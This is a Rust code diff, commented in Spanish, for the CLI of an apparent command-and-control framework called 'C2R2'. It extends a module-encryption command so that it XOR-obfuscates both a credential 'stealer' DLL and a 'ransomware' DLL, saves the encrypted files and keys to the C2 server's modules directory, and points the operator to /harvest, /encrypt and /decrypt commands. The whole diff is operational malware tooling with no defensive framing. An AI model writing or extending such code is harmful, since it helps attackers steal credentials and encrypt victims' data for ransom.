@@ -30,8 +30,12 @@ enum Commands {
         server: String,
     },
     
-    /// Encripta el módulo stealer para ser usado con /harvest
-    EncryptModule,
+    /// Encripta un módulo DLL para ser usado por el agente
+    EncryptModule {
+        /// Módulo a encriptar (stealer o ransomware)
+        #[arg(long, default_value = "stealer")]
+        module: String,
+    },
 }
 
 fn main() {
@@ -55,10 +59,17 @@ fn main() {
             }
         }
         
-        Commands::EncryptModule => {
+        Commands::EncryptModule { module } => {
             println!("🔧 C2R2 Module Encryptor v2.0");
-            println!("📦 Módulo: stealer");
+            println!("📦 Módulo: {}", module);
             println!("{}", "-".repeat(50));
+            
+            // Validar módulo
+            if module != "stealer" && module != "ransomware" {
+                eprintln!("❌ Error: Módulo desconocido '{}'", module);
+                eprintln!("   Módulos disponibles: stealer, ransomware");
+                std::process::exit(1);
+            }
             
             // Obtener el directorio raíz del workspace (desde CARGO_MANIFEST_DIR o current_dir)
             let workspace_root = if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
@@ -84,17 +95,17 @@ fn main() {
             };
             
             // Buscar DLL en target de Windows (cross-compilation desde Linux)
-            let dll_path_win = workspace_root.join("target/x86_64-pc-windows-gnu/release/stealer.dll");
-            let dll_path_native = workspace_root.join("target/release/stealer.dll");
+            let dll_path_win = workspace_root.join(format!("target/x86_64-pc-windows-gnu/release/{}.dll", module));
+            let dll_path_native = workspace_root.join(format!("target/release/{}.dll", module));
             
             let dll_path = if dll_path_win.exists() {
                 dll_path_win
             } else if dll_path_native.exists() {
                 dll_path_native
             } else {
-                eprintln!("❌ Error: No se encontró stealer.dll");
+                eprintln!("❌ Error: No se encontró {}.dll", module);
                 eprintln!("   Ejecuta primero:");
-                eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll");
+                eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package {}-dll", module);
                 eprintln!();
                 eprintln!("   Rutas buscadas:");
                 eprintln!("   - {}", dll_path_win.display());
@@ -104,8 +115,8 @@ fn main() {
             
             println!("📂 DLL encontrada: {}", dll_path.display());
             
-            let output_enc = workspace_root.join("c2r2-server/modules/stealer.enc");
-            let output_key = workspace_root.join("c2r2-server/modules/stealer.key");
+            let output_enc = workspace_root.join(format!("c2r2-server/modules/{}.enc", module));
+            let output_key = workspace_root.join(format!("c2r2-server/modules/{}.key", module));
             
             // Crear directorio modules si no existe
             if let Some(parent) = output_enc.parent() {
@@ -120,7 +131,7 @@ fn main() {
             // Generar clave XOR aleatoria de 32 bytes
             let xor_key = generate_random_key(32);
             
-            println!("\n📦 Encriptando stealer.dll...");
+            println!("\n📦 Encriptando {}.dll...", module);
             match encrypt_dll(&dll_path, &output_enc, &xor_key) {
                 Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
                 Err(e) => {
@@ -139,7 +150,12 @@ fn main() {
             println!("\n📋 Archivos generados:");
             println!("   - {}", output_enc.display());
             println!("   - {}", output_key.display());
-            println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
+            
+            if module == "stealer" {
+                println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
+            } else if module == "ransomware" {
+                println!("\nℹ️  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware");
+            }
         }
     }
 }
